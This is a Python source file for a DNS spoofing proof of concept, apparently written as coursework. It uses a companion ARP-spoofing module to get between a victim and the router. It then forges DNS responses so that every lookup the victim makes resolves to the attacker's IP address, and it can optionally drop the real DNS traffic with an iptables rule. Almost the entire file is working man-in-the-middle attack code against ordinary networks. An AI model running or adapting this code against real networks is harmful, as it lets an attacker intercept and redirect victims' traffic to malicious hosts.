#!/usr/bin/python

#-----------------------------------------------------------------------------
#-- SOURCE FILE:    dnsSpoof.py -   DNS Spoofer Proof of Concept
#--
#-- FUNCTIONS:      configSectionMap(section)
#--                 signalHandler(signal, frame)
#--                 forward()
#--                 default()
#--
#-- DATE:           November 5, 2015
#--
#-- DESIGNERS:      Brij Shah, Callum Styan
#--
#-- PROGRAMMERS:    Brij Shah, Callum Styan
#--
#-- NOTES:
#-- dnsSpoof utilizes arpSpoof to initiate a 'man-in-the-middle' attack then
#-- proceeds to repsond to every DNS request from the victim with the
#-- specified ip address from the config file.
#-----------------------------------------------------------------------------

import ConfigParser, os, platform, sys, signal, multiprocessing, logging, time, argparse, arpSpoof
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from scapy.layers.dns import DNSRR, DNS, DNSQR

operatingSystem = platform.system()
variables = 0

#-----------------------------------------------------------------------------
#-- FUNCTION:       configSectionMap(section)
#--
#-- VARIABLES(S):   section - the section in the config file
#--
#-- NOTES:
#-- Reads the config file and seperates the hardware MAC address and IP 
#-- address associated with it then returns it as a dictionary to be accessed
#-- by arpSpoof and the sniff callback method.
#-----------------------------------------------------------------------------
def configSectionMap(section):
    dict = {}
    config = ConfigParser.ConfigParser()
    config.read('arp.config')
    options = config.options(section)
    for option in options:
        try:
            dict[option] = config.get(section, option)
            if dict[option] == -1:
                DebugPrint("skip: %s" % option)
        except:
            print ("exception on %s!" % option)
            dict[option] = None
    return dict

#-----------------------------------------------------------------------------
#-- FUNCTION:       signalHandler(signal, frame)
#--
#-- VARIABLES(S):   signal
#--
#-- NOTES:
#-- signalHandler is invoked when the OS sends 'ctrl-C' to the application.
#-- Once invoked, the default method is called and the application is
#-- terminated and all processes are killed. 
#-----------------------------------------------------------------------------
def signalHandler(signal, frame):
    default()
    sys.exit(0)

#-----------------------------------------------------------------------------
#-- FUNCTION:       forward()
#--
#-- NOTES:
#-- forward checks the operating system type and invokes the specific IP
#-- forwarding call to foward all packets.
#-----------------------------------------------------------------------------
def forward():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=1')
    elif operatingSystem == 'Linux':
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

#-----------------------------------------------------------------------------
#-- FUNCTION:       default()
#--
#-- NOTES:
#-- default is called on exit. All IP forwarding rules and iptables rules are
#-- reset to default.
#-----------------------------------------------------------------------------
def default():
    if operatingSystem == 'Darwin':
        os.system('sysctl -w net.inet.ip.forwarding=0')
    elif operatingSystem == 'Linux':
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        os.system('iptables -F')

#-----------------------------------------------------------------------------
#-- FUNCTION:       parse(packet)
#--
#-- VARIABLES(S):   packet - the packets being sniffed
#--
#-- NOTES:
#-- parse is the callback for the sniff filter. It receives all packets 
#-- coming into system and parses through all DNS packets. If parse receives
#-- a DNS query from the specified victim, it responds with a crafted DNS
#-- response packet that will send it to the specified URL.
#-----------------------------------------------------------------------------
def parse(packet):
    global variables
    try:
        if packet.haslayer(DNSQR) and packet[IP].src == variables['victimip']:
            packetResponse = (Ether()/IP(dst=packet[0][1].src, src=packet[0][1].dst)/\
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                          DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, \
                          an=DNSRR(rrname=packet[DNS].qd.qname,  ttl=10, rdata=variables['ourip'])))
            sendp(packetResponse, count=1, verbose=0)
    except IndexError:
        pass

#-----------------------------------------------------------------------------
#-- FUNCTION:       firewallRule()
#--
#-- NOTES:
#-- firewallRule created an iptables rule to drop forwarding of any packets
#-- destined for destintion port 53.
#-----------------------------------------------------------------------------
def firewallRule():
	firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
	Popen([firewall], shell=True, stdout=PIPE)

#-----------------------------------------------------------------------------
#-- FUNCTION:       main()
#--
#-- NOTES:
#-- The pseudomain method called by the main function.
#-----------------------------------------------------------------------------
def main():
    global variables
    forward()
    parser = argparse.ArgumentParser()
    parser.add_argument("-ip"
                       ,"--iptablesRule"
                       , help="use an iptables rule to drop all dns traffic on forward chain"
                       ,action="store_true")
    args = parser.parse_args()
    if args.iptablesRule:
        firewallRule()

    variables = configSectionMap('ARP')
    arpProcess = multiprocessing.Process(target = arpSpoof.arpSpoof
                                        , args = (variables['routerip']
                                                 , variables['routermac']
                                                 , variables['victimip']
                                                 , variables['victimmac']
                                                 , variables['ourmac']))
    arpProcess.start()
    signal.signal(signal.SIGINT, signalHandler)
    sniffFilter="udp and port 53"
    sniff(filter=sniffFilter, prn=parse, count=0)
    signal.pause()
    arpProcess.terminate()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print 'exiting..'
